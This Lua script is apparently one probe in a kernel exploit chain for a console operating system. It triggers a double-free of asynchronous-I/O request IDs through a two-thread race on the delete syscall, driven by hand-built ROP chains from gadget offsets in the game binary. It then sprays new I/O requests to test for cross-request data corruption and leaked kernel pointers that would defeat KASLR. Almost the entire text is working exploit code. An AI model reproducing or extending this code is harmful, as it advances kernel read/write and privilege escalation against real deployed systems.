-- CRASH_CLASS: MODERATE
-- PROBE 68d: AIO overlapping I/O completion after double-free
--
-- After the confirmed 662 TOCTOU double-free (65l), new AIO submissions
-- via 669 reclaim the freed slots (same UMA zones). This probe tests
-- whether overlapping completion corrupts data across requests:
--
-- 1. Double-free 16 IDs via 2-child race (65l pattern)
-- 2. Submit 32 new AIO reads: 16 on socketpair-A, 16 on socketpair-B
-- 3. Write 16 bytes of pattern 0xAA to all A peers → triggers A completions
-- 4. Poll all 32 via 664
-- 5. Read B data buffers — if any contain A's data or non-sentinel values,
--    the freed sub-objects are shared and I/O completion is crossing requests
--
-- This establishes whether the double-free produces exploitable corruption
-- in the I/O data path (not just status fields).

print("=== PROBE 68d: OVERLAP COMPLETION ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base for ROP gadgets
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- ROP gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS/SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Open /dev/zero for initial AIO targets
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- AIO constants
local BATCH = 16
local SENTINEL_D = 0xDDDDDDDD
local PATTERN_A = 0xAAAAAAAA

-- AIO submit/poll/delete helpers
local req_buf = memory.alloc(0x30)
local data_scratch = memory.alloc(0x1000)
local res_scratch = memory.alloc(0x100)
local id_scratch = memory.alloc(8)
local st_scratch = memory.alloc(8)

local function submit_one_read(fd, data_ptr, data_size)
    wq(N(req_buf), uint64(0))              -- offset
    wq(N(req_buf) + 8, uint64(data_size))  -- byte count
    local bh, bl = get_hi_lo(uint64(N(data_ptr)))
    wd(N(req_buf) + 0x10, bl); wd(N(req_buf) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(res_scratch)))
    wd(N(req_buf) + 0x18, rl); wd(N(req_buf) + 0x1C, rh)
    wd(N(req_buf) + 0x20, fd); wd(N(req_buf) + 0x24, 0)
    wd(N(id_scratch), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req_buf)), uint64(1), uint64(1), uint64(N(id_scratch)))
    end)
    return rd(N(id_scratch)) or 0
end

local function poll_one(id)
    wd(N(id_scratch), id); wd(N(st_scratch), 0)
    pcall(function()
        mk(664)(uint64(N(id_scratch)), uint64(1), uint64(N(st_scratch)))
    end)
    return rd(N(st_scratch)) or 0
end

local function delete_batch(ids_arr, cnt, states_arr)
    pcall(function()
        mk(662)(uint64(N(ids_arr)), uint64(cnt), uint64(N(states_arr)))
    end)
end

-- ===============================
-- [A] Create socketpairs for I/O targets
-- ===============================
print("")
print("[A] Create socketpairs")

-- socketpair(AF_UNIX=1, SOCK_DGRAM=2, 0, sv)
local sv_buf = memory.alloc(0x10)

-- Set A: 16 socketpairs
local a_read_fds = {}   -- read side (for AIO read)
local a_write_fds = {}  -- write side (for feeding data)
for i = 1, BATCH do
    wd(N(sv_buf), 0); wd(N(sv_buf) + 4, 0)
    local ok, rv = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv_buf)))
    end)
    local ret = ok and sgn(rv) or -999
    if ret == 0 then
        a_read_fds[#a_read_fds + 1] = rd(N(sv_buf)) or -1
        a_write_fds[#a_write_fds + 1] = rd(N(sv_buf) + 4) or -1
    end
end
print(string.format("  set A: %d socketpairs", #a_read_fds))

-- Set B: 16 socketpairs
local b_read_fds = {}
local b_write_fds = {}
for i = 1, BATCH do
    wd(N(sv_buf), 0); wd(N(sv_buf) + 4, 0)
    local ok, rv = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv_buf)))
    end)
    local ret = ok and sgn(rv) or -999
    if ret == 0 then
        b_read_fds[#b_read_fds + 1] = rd(N(sv_buf)) or -1
        b_write_fds[#b_write_fds + 1] = rd(N(sv_buf) + 4) or -1
    end
end
print(string.format("  set B: %d socketpairs", #b_read_fds))

if #a_read_fds < BATCH or #b_read_fds < BATCH then
    print(string.format("  WARNING: only got %d A + %d B pairs (need %d each)",
        #a_read_fds, #b_read_fds, BATCH))
end

local total_pairs = math.min(#a_read_fds, #b_read_fds, BATCH)
if total_pairs == 0 then
    print("NO SOCKETPAIRS — abort")
    print("=== 68d DONE ===")
    return
end

if not alive() then print("DEAD after socketpair creation"); print("=== 68d DONE ==="); return end

-- ===============================
-- [B] Double-free via 2-child race (from 65l)
-- ===============================
print("")
print("[B] Double-free race — " .. BATCH .. " IDs")

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

-- Submit + poll BATCH requests on /dev/zero (to be double-freed)
local df_ids = {}
for i = 1, BATCH do
    local id = submit_one_read(fd_zero, data_scratch, 16)
    if id ~= 0 then
        poll_one(id)
        df_ids[#df_ids + 1] = id
    end
end
print(string.format("  submitted %d IDs for double-free", #df_ids))

if #df_ids == 0 then
    print("NO IDs for double-free — abort")
    print("=== 68d DONE ===")
    return
end

local df_count = #df_ids

-- Write shared ID array
for i = 0, df_count - 1 do
    wd(N(del_ids) + i * 4, df_ids[i + 1])
    wd(N(states_A) + i * 4, 0xAAAAAAAA)
    wd(N(states_B) + i * 4, 0xBBBBBBBB)
end
wq(N(marker_A), uint64(0))
wq(N(marker_B), uint64(0))

-- Build child A ROP: marker + 662(ids, count, states_A) + thr_exit
local stk_A = memory.alloc(0x4000)
local sb_A = N(stk_A)
local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
local oA = 0
local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
emA(g_pop_rax); emA(uint64(0x41414141))
emA(g_pop_rdi); emA(uint64(N(marker_A)))
emA(g_mov_m_rax)
emA(g_pop_rdi); emA(uint64(N(del_ids)))
emA(g_pop_rsi); emA(uint64(df_count))
emA(g_pop_rdx); emA(uint64(N(states_A)))
emA(g_pop_rax); emA(uint64(662))
emA(stub)
emA(g_pop_rdi); emA(uint64(0))
emA(g_pop_rax); emA(uint64(431))
emA(stub)

-- Build child B ROP: marker + 662(ids, count, states_B) + thr_exit
local stk_B = memory.alloc(0x4000)
local sb_B = N(stk_B)
local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
local oB = 0
local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
emB(g_pop_rax); emB(uint64(0x42424242))
emB(g_pop_rdi); emB(uint64(N(marker_B)))
emB(g_mov_m_rax)
emB(g_pop_rdi); emB(uint64(N(del_ids)))
emB(g_pop_rsi); emB(uint64(df_count))
emB(g_pop_rdx); emB(uint64(N(states_B)))
emB(g_pop_rax); emB(uint64(662))
emB(stub)
emB(g_pop_rdi); emB(uint64(0))
emB(g_pop_rax); emB(uint64(431))
emB(stub)

-- thr_new params
local par_A = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
wq(N(par_A), g_bare_ret)
wq(N(par_A) + 0x10, uint64(sb_A))
wq(N(par_A) + 0x18, uint64(0x2000))
local tA = memory.alloc(8); wq(N(tA), uint64(0))
wq(N(par_A) + 0x30, tA)

local par_B = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
wq(N(par_B), g_bare_ret)
wq(N(par_B) + 0x10, uint64(sb_B))
wq(N(par_B) + 0x18, uint64(0x2000))
local tB = memory.alloc(8); wq(N(tB), uint64(0))
wq(N(par_B) + 0x30, tB)

-- Spawn both children back-to-back
pcall(function() mk(455)(par_A, uint64(0x38)) end)
pcall(function() mk(455)(par_B, uint64(0x38)) end)

-- Wait for children
for w = 1, 80000 do local _ = rd(sb_A) end

local mA = N(rq(N(marker_A)) or 0)
local mB = N(rq(N(marker_B)) or 0)

-- Count double-deletes
local doubles = 0
local a_ok = 0
local b_ok = 0
for i = 0, df_count - 1 do
    local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
    local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
    if sA == 0 then a_ok = a_ok + 1 end
    if sB == 0 then b_ok = b_ok + 1 end
    if sA == 0 and sB == 0 then doubles = doubles + 1 end
end

print(string.format("  race: A=%d B=%d doubles=%d ran=%s/%s",
    a_ok, b_ok, doubles, mA ~= 0 and "Y" or "N", mB ~= 0 and "Y" or "N"))

if doubles == 0 then
    print("  NO DOUBLE-FREE this iteration")
    print("  (65l achieves ~13% per iter; retry or increase iterations)")
end

if not alive() then
    print("  *** PROCESS DIED during double-free ***")
    print("=== 68d DONE ===")
    return
end

-- ===============================
-- [C] Submit 32 new AIO reads to reclaim freed slots
-- ===============================
print("")
print("[C] Submit 32 new AIO reads after double-free")

-- Allocate per-request data buffers (16 bytes each)
-- Set A buffers: filled with 0xAA sentinel
-- Set B buffers: filled with SENTINEL_D
local DATA_SIZE = 16
local a_data_bufs = {}
local b_data_bufs = {}
local a_aio_ids = {}
local b_aio_ids = {}

-- Submit set A reads (on set A socketpair read ends)
for i = 1, total_pairs do
    local dbuf = memory.alloc(DATA_SIZE + 0x10)
    for j = 0, DATA_SIZE - 1, 4 do wd(N(dbuf) + j, SENTINEL_D) end
    a_data_bufs[i] = dbuf

    local id = submit_one_read(a_read_fds[i], dbuf, DATA_SIZE)
    a_aio_ids[i] = id
end
print(string.format("  set A: %d reads submitted", #a_aio_ids))

-- Submit set B reads (on set B socketpair read ends)
for i = 1, total_pairs do
    local dbuf = memory.alloc(DATA_SIZE + 0x10)
    for j = 0, DATA_SIZE - 1, 4 do wd(N(dbuf) + j, SENTINEL_D) end
    b_data_bufs[i] = dbuf

    local id = submit_one_read(b_read_fds[i], dbuf, DATA_SIZE)
    b_aio_ids[i] = id
end
print(string.format("  set B: %d reads submitted", #b_aio_ids))

if not alive() then
    print("  *** PROCESS DIED during AIO submission ***")
    print("=== 68d DONE ===")
    return
end

-- ===============================
-- [D] Write data ONLY to set A peers → triggers A completions
-- ===============================
print("")
print("[D] Write 0xAA pattern to set A peers (triggers A reads)")

local write_buf = memory.alloc(DATA_SIZE + 0x10)
for j = 0, DATA_SIZE - 1, 4 do wd(N(write_buf) + j, PATTERN_A) end

local a_writes = 0
for i = 1, total_pairs do
    local ok, rv = pcall(function()
        return mk(4)(uint64(a_write_fds[i]), uint64(N(write_buf)), uint64(DATA_SIZE))
    end)
    if ok and sgn(rv) > 0 then
        a_writes = a_writes + 1
    end
end
print(string.format("  wrote to %d/%d A peers", a_writes, total_pairs))

-- Small delay for completions
for w = 1, 50000 do local _ = rd(N(write_buf)) end

-- ===============================
-- [E] Poll ALL 32 requests
-- ===============================
print("")
print("[E] Poll all 32 AIO requests")

local a_completed = 0
local b_completed = 0

for i = 1, total_pairs do
    if a_aio_ids[i] and a_aio_ids[i] ~= 0 then
        local st = poll_one(a_aio_ids[i])
        -- state 0x3 or 0x10003 = completed
        if st == 3 or st == 0x10003 then a_completed = a_completed + 1 end
    end
end
for i = 1, total_pairs do
    if b_aio_ids[i] and b_aio_ids[i] ~= 0 then
        local st = poll_one(b_aio_ids[i])
        if st == 3 or st == 0x10003 then b_completed = b_completed + 1 end
    end
end
print(string.format("  A completed: %d/%d, B completed: %d/%d",
    a_completed, total_pairs, b_completed, total_pairs))

-- ===============================
-- [F] Check B data buffers for corruption
-- ===============================
print("")
print("[F] Check set B data buffers for cross-contamination")

local b_corrupted = 0
local b_has_a_data = 0
local b_has_kptr = 0
local b_has_unknown = 0

for i = 1, total_pairs do
    local dbuf = b_data_bufs[i]
    local changed = false
    local has_pattern_a = false
    local has_kptr = false
    local vals = {}

    for j = 0, DATA_SIZE - 4, 4 do
        local v = rd(N(dbuf) + j) or SENTINEL_D
        vals[#vals + 1] = v
        if v ~= SENTINEL_D then
            changed = true
            if v == PATTERN_A then has_pattern_a = true end
        end
        -- Check qword pairs for kernel pointers
        if j % 8 == 0 then
            local hi_v = rd(N(dbuf) + j + 4) or SENTINEL_D
            if hi_v >= 0xFFFF8000 and hi_v ~= SENTINEL_D and hi_v ~= 0xFFFFFFFF then
                has_kptr = true
            end
        end
    end

    if changed then
        b_corrupted = b_corrupted + 1
        if has_pattern_a then
            b_has_a_data = b_has_a_data + 1
            print(string.format("  *** B[%d] HAS A's DATA (0xAAAAAAAA) ***", i))
        end
        if has_kptr then
            b_has_kptr = b_has_kptr + 1
            print(string.format("  *** B[%d] HAS KERNEL POINTER ***", i))
        end
        if not has_pattern_a and not has_kptr then
            b_has_unknown = b_has_unknown + 1
        end
        -- Dump the buffer
        local d = {}
        for _, v in ipairs(vals) do d[#d + 1] = string.format("%08X", v) end
        print(string.format("  B[%d]: %s", i, table.concat(d, " ")))
    end
end

-- ===============================
-- [G] Check A data buffers too
-- ===============================
print("")
print("[G] Check set A data buffers")

local a_got_data = 0
local a_got_b_sentinel = 0
for i = 1, total_pairs do
    local dbuf = a_data_bufs[i]
    local has_data = false
    local has_b_sentinel = false
    local vals = {}
    for j = 0, DATA_SIZE - 4, 4 do
        local v = rd(N(dbuf) + j) or SENTINEL_D
        vals[#vals + 1] = v
        if v == PATTERN_A then has_data = true end
        if v == SENTINEL_D and j < DATA_SIZE then end -- still sentinel, not completed
    end
    if has_data then a_got_data = a_got_data + 1 end

    -- Show first 3 A buffers
    if i <= 3 then
        local d = {}
        for _, v in ipairs(vals) do d[#d + 1] = string.format("%08X", v) end
        print(string.format("  A[%d]: %s", i, table.concat(d, " ")))
    end
end
print(string.format("  A with correct data: %d/%d", a_got_data, total_pairs))

-- ===============================
-- [H] Summary
-- ===============================
print("")
print("[H] SUMMARY")
print(string.format("  double-frees:         %d/%d", doubles, df_count))
print(string.format("  A completed:          %d/%d", a_completed, total_pairs))
print(string.format("  B completed:          %d/%d (should be 0 — no data written)", b_completed, total_pairs))
print(string.format("  B buffers changed:    %d/%d", b_corrupted, total_pairs))
print(string.format("  B with A's data:      %d", b_has_a_data))
print(string.format("  B with kernel ptrs:   %d", b_has_kptr))
print(string.format("  B with unknown data:  %d", b_has_unknown))
print(string.format("  process:              %s", alive() and "ALIVE" or "DEAD"))

if b_has_a_data > 0 then
    print("")
    print("*** OVERLAP CONFIRMED: B received A's I/O data ***")
    print("*** The double-freed sub-objects cause cross-request completion ***")
    print("*** This is exploitable for kernel R/W ***")
elseif b_corrupted > 0 then
    print("")
    print("*** B BUFFERS MODIFIED without data written to B peers ***")
    print("*** Corruption source unknown — could be stale kernel data ***")
elseif b_has_kptr > 0 then
    print("")
    print("*** KERNEL POINTERS in B data — KASLR defeat via overlap ***")
elseif doubles == 0 then
    print("")
    print("No double-free this run — race did not hit")
    print("Retry: 65l achieves ~13% hit rate per 16-ID batch")
else
    print("")
    print("Double-free hit but no B corruption detected")
    print("The reclaimed objects may be in different sub-object zones")
end

print("")
print("=== 68d DONE ===")
